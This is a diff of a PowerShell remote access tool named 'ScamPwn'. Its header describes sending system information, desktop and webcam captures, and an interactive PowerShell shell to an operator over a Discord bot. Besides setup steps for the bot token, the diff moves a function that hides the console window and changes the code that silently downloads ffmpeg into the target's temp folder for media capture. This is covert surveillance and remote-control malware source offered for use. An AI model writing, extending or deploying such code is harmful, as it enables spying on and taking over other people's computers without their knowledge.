@@ -1,18 +1,12 @@
 
-<# =========================================  ScamPwn - Discord x Windows Recon ===========================================
+<# ========================================= ScamPwn ===========================================
 
 **SYNOPSIS**
-Uses a Discord bot to send system information, a stream desktop and webcam screenshots,
-and open a powershell command line interface through discord.
+Uses a Discord bot to send system information, a stream desktop and webcam screenshots
+Also opens a powershell command line interface through discord.
 
-**USAGE**
-1. Setup the script
-2. Run the script on a target windows system.
-3. Check discord for a connection.
-4. Enter commands to interact with the target.
-5. Type 'Close' into chat to exit.
 
-**SETUP INSTRUCTIONS**
+**SETUP**
 -SETUP THE BOT
 1. make a discord bot at https://discord.com/developers/applications/
 2. Enable all Privileged Gateway Intents on 'Bot' page
@@ -25,7 +19,6 @@ and open a powershell command line interface through discord.
 ----- Option 1 ----- (token placed in ps1 file) [unsafe]
 1. Copy the token into the script directly below.
 
-
 ----- Option 2 ----- (token hosted online) [slightly safer]
 1. Create a file on Pastebin or Github with the content below - Supply your token and optional webhooks (include braces)
 {
@@ -36,11 +29,11 @@ and open a powershell command line interface through discord.
 }
 2. Copy the RAW file url eg. https://pastebin.com/raw/xxxxxxxx into this script below
 
+
 **INFORMATION**
-- The Discord bot used must be in one server only
+- The Discord bot you use must be in one server only
 - You can specify webhooks to send duplicate files to other channels on another server (OPTIONAL)
-- This script will work with just the Bot Token supplied (no webhooks)
--------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------
 #>
 
 # ------------------------- OPTIONS + SETUP ---------------------------
@@ -64,22 +57,6 @@ $hideconsole = 1
 
 # ------------------------ CREATE FUNCTIONS ---------------------------
 
-# Hide powershell console window function
-function HideWindow {
-    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-    $hwnd = (Get-Process -PID $pid).MainWindowHandle
-    if($hwnd -ne [System.IntPtr]::Zero){
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-    else{
-        $Host.UI.RawUI.WindowTitle = 'hideme'
-        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-        $hwnd = $Proc.MainWindowHandle
-        $Type::ShowWindowAsync($hwnd, 0)
-    }
-}
-
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
     sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
@@ -87,13 +64,15 @@ Function GetFfmpeg{
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
         $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
-        $response = Iwr -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
-        $release = $response.Content | ConvertFrom-Json
+        $wc = New-Object System.Net.WebClient           
+        $wc.Headers.Add("User-Agent", "PowerShell")
+        $response = $wc.DownloadString("$apiUrl")
+        $release = $response | ConvertFrom-Json
         $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
         $zipUrl = $asset.browser_download_url
         $zipFilePath = Join-Path $tempDir $asset.name
         $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
-        Iwr -Uri $zipUrl -OutFile $zipFilePath
+        $wc.DownloadFile($zipUrl, $zipFilePath)
         Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
         Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
         rm -Path $zipFilePath -Force
@@ -265,6 +244,22 @@ Function quickInfo{
         )
     }
     sendMsg -Embed $jsonPayload -webhook $webhook
+}
+
+# Hide powershell console window function
+function HideWindow {
+    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+    $hwnd = (Get-Process -PID $pid).MainWindowHandle
+    if($hwnd -ne [System.IntPtr]::Zero){
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
+    else{
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
 }
 
 # Scriptblock for PS console to discord
